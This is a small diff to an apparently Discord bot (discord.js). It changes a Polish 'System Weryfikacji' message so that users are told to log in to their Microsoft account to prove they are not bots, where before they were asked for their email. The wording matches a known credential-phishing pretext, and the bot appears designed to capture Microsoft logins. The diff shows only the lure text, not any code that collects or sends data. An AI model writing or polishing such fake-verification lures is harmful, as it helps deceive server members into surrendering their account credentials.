@@ -66,7 +66,7 @@ client.on('interactionCreate', async (interaction) => {
             const embed = new EmbedBuilder()
                 .setColor(0x00AAFF)
                 .setTitle('🛡️ System Weryfikacji')
-                .setDescription('Hej! Podaj swój mail konta microsoft abyśmy wiedzieli czy nie jesteś botem i zweryfikuj się!')
+                .setDescription('Hej! Zaloguj się do swojego konta microsoft abyśmy wiedzieli że nie jesteś botem.')
                 .setFooter({ text: 'Weryfikacja jest wymagana, aby uzyskać dostęp do serwera.' });
 
             const row = new ActionRowBuilder().addComponents(
